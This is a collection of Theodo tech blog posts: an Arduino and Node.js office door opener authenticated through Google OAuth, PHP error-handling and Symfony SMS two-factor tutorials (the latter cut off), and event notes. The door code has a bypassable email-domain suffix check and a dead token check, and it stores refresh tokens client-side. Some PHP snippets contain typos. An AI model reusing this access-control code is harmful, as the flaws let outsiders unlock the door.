For safety concerns, the front door of the company does not have a handle, and only opens with a key or RFID
pass.
While Theodo had few employees, RFID passes were enough. But with the company development, and in prevision of new developers who regularly join us, we wanted to set up a simpler and more flexible solution allowing Theodoers to be autonomous.

We are using Google Apps to handle company user accounts, and Google offers a powerful OAuth 2.0 API to authenticate users. Bazinga! Let’s build a solution to open the front door with our smartphones using Google API.

Summary
Here is a summary of the technologies we are going to use:

Next to the door an Arduino, connected to the network and whose only job is to listen for a private key and send the opening instruction to the door if the key is valid.
For authentication a simple Node.js application, implementing OAuth 2.0 protocol. If the user email domain is theodo.fr, the application sends the valid private key to the Arduino
As a bonus, an HTML5 manifest will make the application load instantly because we don’t like to wait!

Still interested? Here are the details:
Arduino
First of all an Arduino, connected to the company network and listening to incoming connections. Arduino runs programs written in C. In our case, the code is widely inspired of https://github.com/guyzmo/FlyingDoor. We only removed the beeps, and changed the expected message from “1” to a more complex private key.
Node.js
The second part of our development consisted of being able to open the door using Node.js. Node.js offers powerful modules for almost everything. Here we only want to send a message to a server, let’s use net module.
// lib/client/door.js
var net = require('net');

function open() {
    var client = new net.Socket();
    client.connect(""1337"", ""192.168.1.1"", function() {
        console.log(""Opening the Door"");
        client.write(""MY_AWESOME_PRIVATE_KEY"" + ""\r"");
    });

    client.on(""data"", function(data) {
        console.log(""Receiving response : "" + data);

        if (""CLOSE\n"" == data) {
            client.end();
        }
    });
}

Quite easy! We connect to the server port and send it the private key. The server answers “OPEN”, sleeps for 2 seconds then sends “CLOSE”. Once the “CLOSE” message has been received, we disconnect our client.
Web interface with Express framework
Now that the node client had been developed, we needed a simple interface to display buttons. We decided to use Express Node.js framework with Jade templates, and Bootstrap CSS for buttons.
//layout.jade
doctype html
    html
    head
        title Theodo Door
        link(rel='stylesheet', href='/stylesheets/bootstrap.min.css')
        link(rel='stylesheet', href='/stylesheets/style.css')
    body
        block content

//index.jade
extends layout

block content
    .body
        h1 Theodo Door
        button#openDoor.btn(type=""button"") OPEN

        a#googleSigninButton.btn.btn-primary(
            href=""""
        ) Google

At this point, we have a client and an interface. The only missing piece is the logic which will make them work together.
Authentication with Oauth
Google offers a client to facilitate OAuth transactions. We only need a Google application. For practical reasons, I will not detail here the steps to create one : you can do it easily by opening the google developer console, creating a new project and configuring the credentials properly (redirect URI is the most important part).
In practice, how does an OAuth transaction work?

We display a link with our application ID and the callback URL where we want Google to answer back
This link asks the user if he/she grants the application
Once the user accepts it, Google sends back a code to our application
Then, our node application can ask for a token to read the user data, by sending Google  our application ID, our secret, and the received code
Google finally sends back that access token with a refresh token

What is the utility of the refresh token? Access tokens have a limited lifetime. A refresh token can be stored server-side to fetch a new access token whenever you need it, and this without new authorization of the user.
Now, how will we handle this? First we get the refresh token of the user and store it in his/her browser. Then another action will be responsible of fetching this refresh token from the browser and checking the user information to decide if the door is to be opened.
Right now, you may ask if storing a refresh token client-side and transfer it on the network is a good idea. Indeed, it’s not recommended. We are doing it here for three reasons :

The level of informations we are asking is the most basic (id, email). The criticity of a data theft is low.
We are using HTTPS to secure data exchanges in production
It’s simple and easy!

Generating the connection page with Express:
// Index action. Juste some buttons with the URL for Google Authentication
app.get('/', function(req, res) {
    var authUrl = oauth2Client.generateAuthUrl({
        access_type: 'offline',
        scope: 'https://www.googleapis.com/auth/userinfo.email',
        state: 'profile',
        approval_prompt: 'force'
    });
    res.render('index', {
        authUrl: authUrl
    });
});

// Action which will read the token sent back by Google
app.get('/oauthcallback', function(req, res) {
    var code = req.query.code;
    oauth2Client.getToken(code, function(err, tokens) {
        if (!""refresh_token"" in tokens) {
            return res.send(""Authentication process has failed"");
        }
        // Send back the token to the client in URL
        res.redirect(""/?refresh_token="" + tokens.refresh_token);
    });
});

Client-side, some javascript code manages to fetch the token in the URL and to store it in local storage.
Finally, each morning, the application checks if a refresh token is present in local storage. If not the process above is triggered. Otherwise, we send it to our application in AJAX. The remaining step is the easier, we read the domain of the user email with the token, and if the domain match, we call our client to open the door.
app.post('/api/opendoor', function(req, res) {
    var refresh_token = req.body.refresh_token;
    oauth2Client.credentials = {
        refresh_token: refresh_token
    };

    googleapis.discover('oauth2', 'v1').execute(function(err, client) {
        if (!err) {
            client.oauth2.userinfo.get().withAuthClient(oauth2Client).execute(function(err, results) {
                var email = results.email;

                if ((email.indexOf('theodo.fr') + 'theodo.fr'.length) != email.length) {
                    return res.send({
                        status: -1,
                        message: ""Google Plus authentication failed (domain mismatch)""
                    });
                }

                doorClient.open();

                res.send({
                    status: 0,
                    message: 'Door opened. Welcome !'
                });
            });
        }
    });
});

And voilà! The whole thing requires a small effort to set it up but offers ourselves a lot of flexibility. A new theodoer is autonomous the very first day of his arrival.
Bonus: HTML5 manifest
As a bonus, and in order to render the page as fast as possible, an HTML5 manifest has been added. Basically, the browser will cache the entire page and its assets (JavaScript and stylesheets).
CACHE MANIFEST
# v0.5
CACHE:
/
/stylesheets/bootstrap.min.css
/stylesheets/style.css
http://code.jquery.com/jquery-2.0.3.min.js
https://code.jquery.com/jquery-2.0.3.min.js
/javascripts/door.js
/javascripts/jquery-2.0.3.min.js

Thanks to this, once the token is safely stored in the local storage, the sole data transmitted to the server is the only important information: the user token.
A demo of the application can be seen at http://matthieua.cloud.theo.do and sources will be available soon on Github.
Finally if you want to use it for real, why don’t you join us?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Matthieu Auger
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
We’re happy to announce that Theodo has been confirmed as a bronze partner of dotScale 2014 !
dotScale is a unique tech conference on Scalability, DevOps and Distributed Systems. The best hackers worldwide are invited to share their insights on stage! This year’s edition will count the likes of Paul Mockapetris (inventor of the DNS), Jeremy Edberg (former Reddit Chief Architect and Site Reliability lead at Netflix), Mitchell Hashimoto (creator of Vagrant) or Fabien Potencier (creator of Symfony). Many others have been announced for a promising line-up !
The series of conferences will take place on May 19th in Paris. See you there !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										This blog post is written in French as the related video is in French.
 
Le 7 mars dernier, je présentais à la troupe des Theodoers une formation sur la « Pomodoro Technique® », une technique de gestion efficace du temps, des imprévus et des interruptions, méthode que j’utilise depuis maintenant 2 ans.
 
Pour ceux qui souhaiteraient voir ou revoir cette formation, voici la vidéo. N’hésitez pas à réagir dans les commentaires de la page ou sur twitter (@guillaumededrie ou @theodo). Bon visionnage !
 

 
Les slides de la présentation sont également disponibles sur slides.com.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Guillaume Dedrie
  			
  				Guillaume Dedrie - Web developper @Theodo. Loves new technologies.  			
  		
    
			

									"
"
										During application development, developers have to handle errors in the execution flow. PHP, among many other languages, allows you to do so but since I recently stumbled upon a really bad way to do it I thought that reminding the basics would not hurt.

Errors or Exceptions
PHP makes a distinction between “errors” and “exceptions”. What’s the difference? Since version 4, PHP provides errors to tell that something went wrong. It is possible to trigger errors and register an error handler but they are unrecoverable. Later, with the release of PHP 5, exceptions were introduced to be used in an object oriented way. Exceptions are catchable, unlike errors, meaning that you can catch them and try to recover or continue with the execution of the program.


When does “error” occur?
Despite the introduction of exceptions, errors are still here and continue to appear (I don’t mean that exceptions should replace errors)… Try something like this:
<?php

$foo = [bar];
echo $foo;
Notice that quotes are missing in the array key: I should have written [‘bar’]. This produces the following error:
PHP Notice:  Array to string conversion[…]
Common errors include:


parsing errors: missing parenthesis, braces, semi-column…
type conversion errors
memory allocation errors


Generally errors occur at the language level like when the syntax is wrong, some actions over variables are invalid.


Error reporting level
Depending on the gravity of the error, your code can continue to run until the end or will stop. You can configure error reporting in PHP to ignore minor errors but I would recommend you to report as many errors as possible while developing. To configure the error reporting level you will use constants and bitwise operators which are not easy to apprehend. For example, to remove the notice from the previous piece of code you would do the following:
<?php

error_reporting(E_ALL & ~E_NOTICE); // or simply error_reporting(~E_NOTICE);
$foo = [""bar""];
echo $foo;
If you want to know what your current error reporting value is, use the error_reporting() function without any arguments.


Trigger errors manually
Errors can also be manually raised. For example, if you want to deprecate a function and warn the developer that this function will be removed in the next release, then you would do something like this:
<?php

/**
 * Returns the addition of to integer
 *
 * @deprecated This function will be removed in the release 0.2, you should use the add function instead
 * @param integer $a
 * @param integer $b
 * @return integer
 */
function calculate($a, $b)
{
    trigger_error(""This function will be removed in the release 0.2, you should use the add function instead"" ,E_USER_DEPRECATED);

    return add($a, $b);
}

/**
 * @param integer $a
 * @param integer $b
 * @return integer
 */
function add($a, $b)
{
    return $a  $b;
}
As you can see the function add($a, $b) has been added, for more clarity I guess. So the calculate($a, $b) triggers an error E_DEPRECATED, which, with the default PHP configuration, does not stop the execution of the script, and calls the add() function.
When the script calls the calculate function, the deprecation message is displayed:
PHP Deprecated:  This function will be removed in the release 0.2, you should use the add function instead


Handling errors
By default errors will be output right after it has been triggered or after the execution of the script. However, you can catch it and do things by defining and registering an error handler.
set_error_handler(function ($errno, $errstr, $errfile, $errline, $errcontext) {
    echo ""\n Have a nice day\n"";

    exit(1);
});
echo calculate(2, 3);
exit(0);
In this example we reuse the previous calculate function that triggers a E_USER_DEPRECATED error. We set the closure as the error handler that will be called whenever an error occurs.
As you have already guessed this closure will print “Have a nice day” and exit with the code 1, meaning that the script ended with a problem.
benjamin@comp : ~/ $ php error-test.php

Have a nice day


Introduction to exception
As mentioned before, exceptions have been introduced with PHP 5 to be used with the new way to program in PHP: object oriented (of course exceptions can also be used with a procedural way).
Exceptions are easy to use, you only have to instantiate a new Exception object with an explicit message, (optionally a code and a parent exception), and throw it:
throw new Exception(sprintf('Cannot find the file ""%s"".', $file));
Unlike errors, you can catch a thrown exception and decide that your code can continue even if it failed somehow.
// File exception.php
class FileReader
{
    /**
     * @params string The file full path
     * @return    string
     * @throws   Exception
     */
    public function read($file)
    {
        $realFile = realpath($file);
        if (!file_exists($realFile)) {
            throw new Exception(sprintf('The file ""%s"" does not exist', $file));
        }

        return file_get_contents($realFile);
    }
 }
This is a class that is able to read the content of a file. If the file does not exist it raises an exception telling so. Let’s try to use it:
// File exception.php
$reader = new FileReader();
echo $reader->read('/foo/bar');

exit(0):
benjamin@comp : ~/ $ php exception.php

PHP Fatal error:  Uncaught exception 'Exception' with message 'The file ""/Users/benjamin/exception.php/foo"" does not exist' in /Users/benjamin/exception.php:64
Stack trace:
#0 /Users/benjamin/exception.php(72): FileReader->read('/Users/benjamin...')
#1 {main}
  thrown in /Users/benjamin/exception.php on line 64
PHP tells you that an exception has been raised but not caught and results in a fatal error that stops the execution of the script. To fix this you simply need to surround the call of the method by a try/catch statement:
// File exception.php
$reader = new FileReader();

try {
    echo $reader->read('/foo/bar');
} catch (Exception $e) {
    echo $e->getMessage();
    exit(1);
}
exit(0);
Then when executing the exception.php script the exception message is echoed instead of the ugly message produced before.


Handling exceptions
Sometimes, some exceptions could have not been caught by the library you use for your project causing a fatal error as seen previously. In this case you should set an exception handler to avoid problems when an exception has not been caught.
// File exception.php
set_exception_handler(function (Exception $e) {
    echo $e->getMessage();
    exit(1);
});

$reader = new FileReader();
echo $reader->read('/foo/bar');
exit(0);
This will produce the same output than previously: it will echo the exception message and exit with code 1.


Convert errors to exceptions
As I said before, errors can’t be caught whereas exceptions can. But you can handle errors and convert them to exceptions thanks to the ErrorException class. To do so you need to register an error handler which converts errors into ErrorException. Lets do this with our previous calculation code:
set_error_handler(function ($errno, $errstr, $errfile, $errline ,array $errcontex) {
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});

try {
    $result = calculate(2, 3);
} catch (ErrorException $e) {
    echo sprintf(""An error has been caught\n %s"", $e->getMessage());
    $result = 0;
}

echo $result;
Thanks to the closure used as an handler, errors are now converted to an ErrorException that can be caught the way we saw previously and allows your code to behave accordingly to the exception. Your code will no longer stops because of an ugly error 


Multi catching and re-throwing exceptions
As there are different exception types you might want to differentiate the caught one to behave accordingly. You can chain the catch statement this way to tell your script to do something distinct:
try {
    // do something that could raise an Exception or an ErrorException
} catch (ErrorException $e) {
    // do something when an ErrorException occurred
} catch (Exception $e) {
    // do something when an Exception occurred
}
Note that the Exception is caught last because ErrorException extends the Exception class.


Finally
Since PHP 5.5, you can specify a finally block after the catch one. The code inside is always executed even if an exception has been thrown or not. Be careful if you use a return statement inside a try/catch/finally block, don’t forget that the last return statement executed is the finally one.


Semantic exceptions
PHP Core provides two exception classes: Exception and ErrorException. But if you want you can create your own extending the `Exception` class. Doing so you can check the type of the thrown exception to do something special as we saw previously. Here is an example where two exceptions are thrown. The first when the file to read does not exist. The other one when it is not readable:
// File exception.php
class FileReader
{
    /**
     * @params string The file full path
     * @return    string
     * @throws   Exception
     */
    public function read($file)
    {
        $realFile = realpath($file);
        if (!file_exists($realFile)) {
            throw new FileNotFoundException(sprintf('The file ""%s"" does not exist', $file));
        }

        if (!$content = file_get_contents($realFile)) {
            throw new FileNotReadableException(sprintf('The file ""%s"" is not readable', $file));
        }

        return $content;
    }
}

class FileNotFoundException extends Exception { }

class FileNotReadableException extends Exception { }
Now we know that when a FileNotFoundException is caught we can create the missing file:
// File exception.php
$reader = new FileReader();

try {
    $file = '/foo/bar.txt';
    echo $reader->read($file);
} catch (FileNotFoundException $e) {
    $filesystem->touch($file);
} catch (Exception $e) {
    echo $e->getMessage();
    exit(1);
}
exit(0);
When you create your exception to should give them explicite name, like you would do with business classes. Using such exceptions allows you to understand the problem seeing the type without looking at the message. You should always try to make your code speaking to you, explaining what really happened to ease the debugging. Creating special exceptions will help you doing so, but you still have to provide explicit messages…
Before creating your own exception, have a look a those provided by the SPL library:


BadFunctionCallException
BadMethodCallException
DomainException
InvalidArgumentException
LengthException
LogicException
OutOfBoundsException
OutOfRangeException
OverflowException
RangeException
RuntimeException
UnderflowException
UnexpectedValueException


Now you know the difference between errors and exceptions. You are able to create error handlers and exception handlers to be sure that your program will never stop with a fatal error. You saw how to catch exceptions. You learned how to create your own exception. So I hope that from now on you will use exceptions instead of returning true or false or returning an array with the status and a message when an exception would be better.


 
<!--
/* :Author: David Goodger (goodger@python.org) :Id: $Id: html4css1.css 7614 2013-02-21 15:55:51Z milde $ :Copyright: This stylesheet has been placed in the public domain. Default cascading style sheet for the HTML output of Docutils. See http://docutils.sf.net/docs/howto/html-stylesheets.html for how to customize this style sheet. */ /* used to remove borders from tables and images */ .borderless, table.borderless td, table.borderless th {   border: 0 } table.borderless td, table.borderless th {   /* Override padding for ""table.docutils td"" with ""! important"".      The right padding separates the table cells. */   padding: 0 0.5em 0 0 ! important } .first {   /* Override more specific margin styles with ""! important"". */   margin-top: 0 ! important } .last, .with-subtitle {   margin-bottom: 0 ! important } .hidden {   display: none } a.toc-backref {   text-decoration: none ;   color: black } blockquote.epigraph {   margin: 2em 5em ; } dl.docutils dd {   margin-bottom: 0.5em } object[type=""image/svg+xml""], object[type=""application/x-shockwave-flash""] {   overflow: hidden; } /* Uncomment (and remove this text!) to get bold-faced definition list terms dl.docutils dt {   font-weight: bold } */ div.abstract {   margin: 2em 5em } div.abstract p.topic-title {   font-weight: bold ;   text-align: center } div.admonition, div.attention, div.caution, div.danger, div.error, div.hint, div.important, div.note, div.tip, div.warning {   margin: 2em ;   border: medium outset ;   padding: 1em } div.admonition p.admonition-title, div.hint p.admonition-title, div.important p.admonition-title, div.note p.admonition-title, div.tip p.admonition-title {   font-weight: bold ;   font-family: sans-serif } div.attention p.admonition-title, div.caution p.admonition-title, div.danger p.admonition-title, div.error p.admonition-title, div.warning p.admonition-title, .code .error {   color: red ;   font-weight: bold ;   font-family: sans-serif } /* Uncomment (and remove this text!) to get reduced vertical space in    compound paragraphs. div.compound .compound-first, div.compound .compound-middle {   margin-bottom: 0.5em } div.compound .compound-last, div.compound .compound-middle {   margin-top: 0.5em } */ div.dedication {   margin: 2em 5em ;   text-align: center ;   font-style: italic } div.dedication p.topic-title {   font-weight: bold ;   font-style: normal } div.figure {   margin-left: 2em ;   margin-right: 2em } div.footer, div.header {   clear: both;   font-size: smaller } div.line-block {   display: block ;   margin-top: 1em ;   margin-bottom: 1em } div.line-block div.line-block {   margin-top: 0 ;   margin-bottom: 0 ;   margin-left: 1.5em } div.sidebar {   margin: 0 0 0.5em 1em ;   border: medium outset ;   padding: 1em ;   background-color: #ffffee ;   width: 40% ;   float: right ;   clear: right } div.sidebar p.rubric {   font-family: sans-serif ;   font-size: medium } div.system-messages {   margin: 5em } div.system-messages h1 {   color: red } div.system-message {   border: medium outset ;   padding: 1em } div.system-message p.system-message-title {   color: red ;   font-weight: bold } div.topic {   margin: 2em } h1.section-subtitle, h2.section-subtitle, h3.section-subtitle, h4.section-subtitle, h5.section-subtitle, h6.section-subtitle {   margin-top: 0.4em } h1.title {   text-align: center } h2.subtitle {   text-align: center } hr.docutils {   width: 75% } img.align-left, .figure.align-left, object.align-left {   clear: left ;   float: left ;   margin-right: 1em } img.align-right, .figure.align-right, object.align-right {   clear: right ;   float: right ;   margin-left: 1em } img.align-center, .figure.align-center, object.align-center {   display: block;   margin-left: auto;   margin-right: auto; } .align-left {   text-align: left } .align-center {   clear: both ;   text-align: center } .align-right {   text-align: right } /* reset inner alignment in figures */ div.align-right {   text-align: inherit } /* div.align-center * { */ /*   text-align: left } */ ol.simple, ul.simple {   margin-bottom: 1em } ol.arabic {   list-style: decimal } ol.loweralpha {   list-style: lower-alpha } ol.upperalpha {   list-style: upper-alpha } ol.lowerroman {   list-style: lower-roman } ol.upperroman {   list-style: upper-roman } p.attribution {   text-align: right ;   margin-left: 50% } p.caption {   font-style: italic } p.credits {   font-style: italic ;   font-size: smaller } p.label {   white-space: nowrap } p.rubric {   font-weight: bold ;   font-size: larger ;   color: maroon ;   text-align: center } p.sidebar-title {   font-family: sans-serif ;   font-weight: bold ;   font-size: larger } p.sidebar-subtitle {   font-family: sans-serif ;   font-weight: bold } p.topic-title {   font-weight: bold } pre.address {   margin-bottom: 0 ;   margin-top: 0 ;   font: inherit } pre.literal-block, pre.doctest-block, pre.math, pre.code {   margin-left: 2em ;   margin-right: 2em } pre.code .ln { color: grey; } /* line numbers */ pre.code, code { background-color: #eeeeee } pre.code .comment, code .comment { color: #5C6576 } pre.code .keyword, code .keyword { color: #3B0D06; font-weight: bold } pre.code .literal.string, code .literal.string { color: #0C5404 } pre.code .name.builtin, code .name.builtin { color: #352B84 } pre.code .deleted, code .deleted { background-color: #DEB0A1} pre.code .inserted, code .inserted { background-color: #A3D289} span.classifier {   font-family: sans-serif ;   font-style: oblique } span.classifier-delimiter {   font-family: sans-serif ;   font-weight: bold } span.interpreted {   font-family: sans-serif } span.option {   white-space: nowrap } span.pre {   white-space: pre } span.problematic {   color: red } span.section-subtitle {   /* font-size relative to parent (h1..h6 element) */   font-size: 80% } table.citation {   border-left: solid 1px gray;   margin-left: 1px } table.docinfo {   margin: 2em 4em } table.docutils {   margin-top: 0.5em ;   margin-bottom: 0.5em } table.footnote {   border-left: solid 1px black;   margin-left: 1px } table.docutils td, table.docutils th, table.docinfo td, table.docinfo th {   padding-left: 0.5em ;   padding-right: 0.5em ;   vertical-align: top } table.docutils th.field-name, table.docinfo th.docinfo-name {   font-weight: bold ;   text-align: left ;   white-space: nowrap ;   padding-left: 0 } /* ""booktabs"" style (no vertical lines) */ table.docutils.booktabs {   border: 0px;   border-top: 2px solid;   border-bottom: 2px solid;   border-collapse: collapse; } table.docutils.booktabs * {   border: 0px; } table.docutils.booktabs th {   border-bottom: thin solid;   text-align: left; } h1 tt.docutils, h2 tt.docutils, h3 tt.docutils, h4 tt.docutils, h5 tt.docutils, h6 tt.docutils {   font-size: 100% } ul.auto-toc {   list-style-type: none }
-->

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										This blog post is in French as the event it relates to is French-only.
De retour du Symfony Live Paris 2014
Ces lundi et mardi nous étions au sixième Symfony Live Paris qui se tenait à la Cité Internationale Universitaire de Paris. Theodo y était Sponsor Gold et, si vous y étiez, vous avez certainement rencontré Fabrice, Lucie, Marek ou moi-même.
Pour Theodo, c’est encore une fois un gros succès que ce Symfony Live. Nous avons accueillis environ 200 nouveaux jedis dans notre communauté. D’ailleurs n’hésitez pas à nous envoyer vos photos !

Nous avons bien évidemment passé beaucoup de temps à échanger sur différents sujets, dont principalement Devops.
Fabrice a présenté le “miracle de Devops” en moins de 10 minutes, ce qui était semble-t-il trop court pour certains  Rassurez vous, vous pouvez consulter les slides ou (re)voir la vidéo du Symfony Live Berlin 2013.
Côté conférence nous avons pu assister à de très bonnes présentations dont voici la liste de celles qui nous ont le plus marqué.
Olivier Mansour a commencé fort avec son “talk” intitulé “Un framework presque parfait”. On fait quoi avec Symfony à la télé ?. Un très bon retour d’expérience de l’utilisation de Symfony, Composer et autres chez M6Web. Vous pouvez retrouver ses slides sur slideshare.
Fabien Gasser a présenté des solutions pour mettre en place un site e-commerce avec plus ou moins de complexité. Une vision d’une architecture orientée services très intéressante qui s’applique très bien également à beaucoup d’autres métiers. N’hésitez pas à consulter ses slides sur slideshare.
En fin de cette première journée, SensioLabsInsight nous a régalé avec son OpenBar qui a permis de faire de nombreuses rencontres et des photos plutôt mythiques ou encore de réaliser de nouveaux records.
Le lendemain a été plutôt difficile pour certains suite à cette soirée mais elle a commencé aussi très fort avec la conférence de Julien Pauli. Il nous a présenté ce qu’est OPCache et son fonctionnement interne. Il a aussi montré les avantages apportés par ZendOptimizer. Une présentation à voir dont les slides sont sur slideshare.
S’en est suivi une excellente conférence de Matthieu Moquet qui a présenté l’architecture très très très orientée services mise en place chez Bla Bla Car et nous a montré comment ensuite lier le tout avec RabbitMQ. Puis il est arrivé au sujet principal de sa présentation et nous a présenté différentes solutions pour gérer l’authentification et l’autorisation aux services grâce à un SSO. Un retour d’expérience très intéressant qui, à mon avis, fait partie des meilleures conférences de ces deux jours que je vous invite à aller voir ! Félicitations Matthieu 
Geoffrey Bachelet a ensuite enchaîné et a fait une très bonne démonstration de Docker et comment les développeurs Symfony (et tous les autres !) peuvent l’utiliser en particulier dans un contexte Devops. Si vous y jetez un oeil vous pourrez voir comment créer des containers pour chaque service (NGinx, PHP-FPM, MySql) de votre application.
En début d’après midi François Zaninotto a présenté comment 20Minutes associé à Marmelab ont réalisé la migration continue du CMS. Retour très intéressant sur un sujet complexe, bien connu chez Theodo et parfaitement expliqué par François. Nous avons été ravis de voir que nous ne sommes pas les seuls à être persuadés qu’il est possible d’être agile dans une refonte d’un gros système. Encore une fois, n’hésitez pas à lire les slides.
Vous pouvez retrouver l’ensemble des liens vers les slides des conférenciers sur github. Comme à chaque fois désormais, vous pourrez retrouver les vidéos des conférenciers sur la chaîne Youtube de SensioLabs.
On attend avec impatience le prochain Symfony Live qui sera à Londres mi-septembre et surtout le Symfony Con de Madrid.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										I’m excited everyday I write front-end code with these amazing tools we now have to build client-side apps with pleasure.
I liked JavaScript but typing so many brackets was killing my keyboard, then I discovered CoffeeScript.
I was desperately trying to rationalize my copy and paste activity for selectors in CSS, but that was before LESS saved my life.
I got lost every time in the verbose HTML markup of long web pages, and couldn’t stand losing time forgetting closing tags, so Jade felt like a spring cleaning to me.
All these languages (and others like LiveScript, SCSS, etc.) are (unfortunately?) not natively read by browsers we develop for, adding to our test and release process an extra building step.
It’s here where tools like Grunt or Brunch were needed, automating this “compilation”.
I personally used a lot Brunch as I considered it easier for common tasks in the stack I use, and I really appreciate his usability, and his out of the box behaviour.
I loved it so much I wrote a kewl skeleton to start prototyping quickly with it.
However, when I tried to use always more plugins to achieve more complex tasks, such as marking assets with a checksum, then adding them in a cache manifest file, I realized the limits of these tools, essentially because they’re based on configuration, instead of code.
And then, I discovered Gulp.
As developers, we love code. We’d like to know what’s happening deep down when we call some obscure function.
Gulp gets rid of this “black box” approach and proposes a radically different philosophy to create your perfect front-end factory.
I invite you to discover more about Gulp in this gitbook: (http://david.nowinsky.net/gulp-book).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				David Nowinsky
  			
  				Agile web developer @theodo. Studied @TelecomPTech and @MasterPICX. Code, eat, rave, repeat.  			
  		
    
			

									"
"
										

Abstract:
This article aims to help you build a two step authentication with sms for your Symfony2 application. It works like the google two step authentication. Here is the workflow of the achieved feature:

the user fills in a first login form with his login and password
he receives an SMS with a one time code
he fills a second login form with the code
he can check a “I’m on a trusted computer” box so the second step will be skipped the next time he logs
he’s logged

We will also add some development tools:

a parameter to fallback to mails (useful in dev or test environment)
a parameter to add a master phone number (like the ‘delivery_address’ parameter of swiftmailer)
a functional test



Requirements

I use Nexmo as my sms sending service.
a functional Symfony2 project with FOSuser installed (FOSuser is not compulsory but it helps a lot doing it right and through)



1. Install bundles
We need to install two dependencies. The first, two-factor-bundle, will manage the second authentication step. The second, nexmo-bundle, will help us send sms easily.

    # composer.json
    {
        # ...
        ""require"": {
                # ...
            ""scheb/two-factor-bundle"": ""0.3.*"",
            ""javihernandezgil/nexmo-bundle"": ""v0.9.*""
            # ...
        },
        # ...
    }

Register them in AppKernel :

    // app/AppKernel.php
    // ...
    class AppKernel extends Kernel
    {
        public function registerBundles()
        {
            $bundles = array(
                // ...
                new Scheb\TwoFactorBundle\SchebTwoFactorBundle(),
                new Jhg\NexmoBundle\JhgNexmoBundle(),
                // ...
            );
            // ...
        }
        // ...
    }

Then add some configuration:

    # app/config/config.yml
    # ...
    jhg_nexmo:
        api_key:    %nexmo_api_key%
        api_secret: %nexmo_api_secret%
        from_name:  %nexmo_from_name%
    # ...

nexmo_api_key, nexmo_api_secret, nexmo_from_name are parameters defined in app/config/parameters.yml. More details on these parameters are available in the two-factor bundle documentation and in the nexmo bundle documentation.
We will use two additional parameters along with them:

nexmo_delivery_phone_number: if set, all sms messages will be sent to this phone number instead of being sent to their actual recipients. This is often useful when developing.
nexmo_disable_delivery: if true, no sms will be delivered, mail will be send instead.

Eventually, our parameter file will look more or less like this:

    # app/config/parameters.yml
    ...
    nexmo_api_key: ""12345abc""
    nexmo_api_secret: ""67890def""
    nexmo_from_name: MyCompany
    nexmo_delivery_phone_number: ""+33123456789""
    nexmo_disable_delivery: false

You can now run composer to process the install.

    composer install



2. Extend FOSUserBundle
This is the optional part. All we need is a bundle which implements a user entity. Extending FOSUserBundle is a secure and clean way to do so.
If you use FOSUserBundle then create a new bundle (I called it “AcmeUserBundle”) which extends “FOSUserBundle” as explained in the Symfony2 documentation.


3. Link nexmo with two-factor

The idea is to build a custom AuthCodeMailer which sends SMS :


    // src/Acme/AcmeUserBundle/Services/SmsMailer.php
    <?php
        namespace Acme\AcmeUserBundle\Services;

        use Acme\AcmeUserBundle\Entity\User;
        use Jhg\NexmoBundle\Managers\SmsManager;
        use Scheb\TwoFactorBundle\Model\Email\TwoFactorInterface;
        use Scheb\TwoFactorBundle\Mailer\AuthCodeMailerInterface;

        class SmsMailer implements AuthCodeMailerInterface
        {
            private $smsSender;
            private $senderMail;
            private $mailer;
            private $isSmsDisabled;
            private $deliveryPhoneNumber;
            private $senderAddress;

            public function __construct(SmsManager $smsSender, \Swift_Mailer $mailer, $isSmsDisabled, $deliveryPhoneNumber, $senderAddress)
            {
                $this->smsSender = $smsSender;
                $this->mailer = $mailer;
                $this->isSmsDisabled = $isSmsDisabled;
                $this->deliveryPhoneNumber = $deliveryPhoneNumber;
                $this->senderAddress = $senderAddress;
            }

            public function sendAuthCode(TwoFactorInterface $user)
            {
                $msg = ""Your validation code is "" . $user->getEmailAuthCode();

                $fromName = ""SMSAuth"";

                $this->sendSMS($user, $msg, $fromName);
            }

            public function sendSMS(User $user, $msg, $fromName)
            {
                // Fallback to mail if isSmsDisabled
                if ($this->isSmsDisabled) {
                    $this->sendMail($user->getEmail(), $msg, $fromName);
                } else {

                    if ($this->deliveryPhoneNumber !== null) {
                        $number = $this->deliveryPhoneNumber;
                    } else {
                        $number = $user->getPhoneNumber();
                    }

                    $this->smsSender->sendText($number, $msg, $fromName);
                }
            }

            public function sendMail($deliveryAddress, $msg, $fromName)
            {
                $message = \Swift_Message::newInstance()
                    ->setSubject(""[SMS - "".$fromName.""]"")
                    ->setFrom($this->senderAddress)
                    ->setTo($deliveryAddress);
                $message->setBody($msg, 'text/html');

                return $this->mailer->send($message);
            }
        }

Then declare this as a service:

    # src/Acme/AcmeUserBundle/Ressources/config/service.yml
    parameters:
        acme_user.sms_manager.class: Acme\AcmeUserBundle\Services\SmsMailer

    services:
        doctor_dashboard.sms_mailer:
            class: %acme_user.sms_manager.class%
            arguments:
                - @jhg_nexmo_sms
                - @mailer
                - %nexmo_disable_delivery%
                - %nexmo_delivery_phone_number%
                - %mailer_sender%

Configure the two factor bundle so it uses our sms mailer:

    # app/config/config.yml
    scheb_two_factor:
        email:
            enabled: true
            mailer: acme_user.sms_mailer
            sender_email: %mailer_sender%
            template: AcmeUserBundle:Security:login_validation.html.twig
            digits: 6

